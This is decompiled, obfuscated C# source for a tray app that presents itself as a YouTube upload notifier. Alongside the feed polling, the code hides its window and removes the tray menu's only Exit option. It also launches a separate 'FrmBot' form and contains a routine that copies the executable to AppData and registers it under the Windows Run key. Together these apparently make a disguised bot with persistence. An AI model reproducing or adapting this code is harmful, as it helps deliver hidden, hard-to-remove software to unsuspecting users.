using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Text.RegularExpressions;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace YoutubeFeedUpdater;

public class HiddenForm : Form
{
	private const string string_0 = "https://gdata.youtube.com/feeds/api/users/{0}/uploads?v=2.1&alt=json";

	private const string string_1 = "https://www.youtube.com/watch?v={0}";

	private const string string_2 = "Software\\YouTubeNotifier";

	private const string string_3 = "last_views";

	private const int int_0 = 5;

	private const int int_1 = 7;

	private const string string_4 = "xxxxxx";

	private const string string_5 = "New Upload";

	private const string string_6 = "{0} has uploaded a new video!";

	private const bool bool_0 = true;

	private const string string_7 = "YouTube Notifier";

	private const bool bool_1 = false;

	private string string_8 = string.Empty;

	private IContainer icontainer_0 = null;

	private NotifyIcon notifyIcon_0;

	private ContextMenuStrip mainMenu;

	private ToolStripMenuItem exitToolStripMenuItem;

	public HiddenForm()
	{
		Registry.CurrentUser.CreateSubKey("Software\\YouTubeNotifier");
		InitializeComponent();
		Timer timer = new Timer(5000.0);
		timer.Elapsed += method_0;
		timer.Start();
		method_0(null, null);
		_ = 0;
		notifyIcon_0.set_ContextMenuStrip((ContextMenuStrip)null);
		((Control)new FrmBot()).Show();
	}

	private static void smethod_0()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			_ = 0;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\YouTube Notifier.exe";
			File.Copy(Application.get_ExecutablePath(), text);
			registryKey.SetValue("YouTube Notifier", text);
		}
		catch
		{
		}
	}

	private static void smethod_1(int int_2)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\YouTubeNotifier");
		registryKey.SetValue("last_views", int_2);
	}

	private static int smethod_2()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\YouTubeNotifier");
		return (int)registryKey.GetValue("last_views", -1);
	}

	private void method_0(object sender, ElapsedEventArgs e)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Proxy = null;
			webClient.CachePolicy = new RequestCachePolicy(RequestCacheLevel.NoCacheNoStore);
			webClient.DownloadStringCompleted += method_1;
			webClient.DownloadStringAsync(new Uri(string.Format("https://gdata.youtube.com/feeds/api/users/{0}/uploads?v=2.1&alt=json", "xxxxxx")));
		}
		catch
		{
		}
	}

	private void method_1(object sender, DownloadStringCompletedEventArgs e)
	{
		try
		{
			if (!e.Cancelled && e.Error == null)
			{
				int num = smethod_2();
				int num2 = int.Parse(Regex.Match(e.Result, "openSearch\\$totalResults\"\\:\\{\\\"\\$t\\\"\\:(.*)\\},\\\"openSearch\\$startIndex\\\"").Groups[1].Value);
				string value = Regex.Match(e.Result, "video:(.*)\\\"").Groups[1].Value;
				string tag = (string_8 = value.Substring(0, value.IndexOf("}", StringComparison.Ordinal) - 1));
				if (num != -1 && num2 > num)
				{
					notifyIcon_0.set_Tag((object)tag);
					notifyIcon_0.ShowBalloonTip(7000, "New Upload", string.Format("{0} has uploaded a new video!", "xxxxxx"), (ToolTipIcon)1);
				}
				smethod_1(num2);
			}
		}
		catch
		{
		}
	}

	protected override void SetVisibleCore(bool value)
	{
		if (!((Control)this).get_IsHandleCreated() && value)
		{
			((Form)this).CreateHandle();
			value = false;
		}
		((Form)this).SetVisibleCore(value);
	}

	private void exitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Application.Exit();
		Environment.Exit(0);
	}

	private void notifyIcon_0_BalloonTipClicked(object sender, EventArgs e)
	{
		if (!(string_8 == ""))
		{
			Process.Start($"https://www.youtube.com/watch?v={string_8}");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(HiddenForm));
		notifyIcon_0 = new NotifyIcon(icontainer_0);
		mainMenu = new ContextMenuStrip(icontainer_0);
		exitToolStripMenuItem = new ToolStripMenuItem();
		((Control)mainMenu).SuspendLayout();
		((Control)this).SuspendLayout();
		notifyIcon_0.set_ContextMenuStrip(mainMenu);
		notifyIcon_0.set_Icon((Icon)componentResourceManager.GetObject("barIcon.Icon"));
		notifyIcon_0.set_Text("Youtube Updater");
		notifyIcon_0.set_Visible(true);
		notifyIcon_0.add_BalloonTipClicked((EventHandler)notifyIcon_0_BalloonTipClicked);
		((ToolStrip)mainMenu).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)exitToolStripMenuItem });
		((Control)mainMenu).set_Name("mainMenu");
		((Control)mainMenu).set_Size(new Size(93, 26));
		((ToolStripItem)exitToolStripMenuItem).set_Name("exitToolStripMenuItem");
		((ToolStripItem)exitToolStripMenuItem).set_Size(new Size(92, 22));
		((ToolStripItem)exitToolStripMenuItem).set_Text("Exit");
		((ToolStripItem)exitToolStripMenuItem).add_Click((EventHandler)exitToolStripMenuItem_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(158, 40));
		((Control)this).set_Name("HiddenForm");
		((Control)this).set_Text("Form1");
		((Control)mainMenu).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
